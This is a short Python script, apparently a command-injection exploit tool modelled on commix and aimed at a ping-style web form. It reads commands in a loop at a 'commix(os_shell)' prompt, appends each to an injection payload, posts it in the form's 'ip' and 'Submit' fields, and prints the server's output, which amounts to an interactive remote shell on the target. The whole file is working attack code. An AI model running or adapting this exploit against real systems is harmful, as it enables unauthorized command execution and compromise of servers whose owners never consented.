import requests
from bs4 import BeautifulSoup

def run(url, headers, payload):
    # print(payload.split(":"))

    while True:
        command = input("commix(os_shell) > ")
        if command.upper() == "QUIT":
            break
        
        attack = payload + command
        
        data = {
            "ip": f"{attack}",
            "Submit": f"{attack}"
        }
        
        res = requests.post(url, data=data, headers=headers)
        soup = BeautifulSoup(res.text, 'html.parser') 
        pre_tag = soup.find('pre')
        print(pre_tag.text.strip())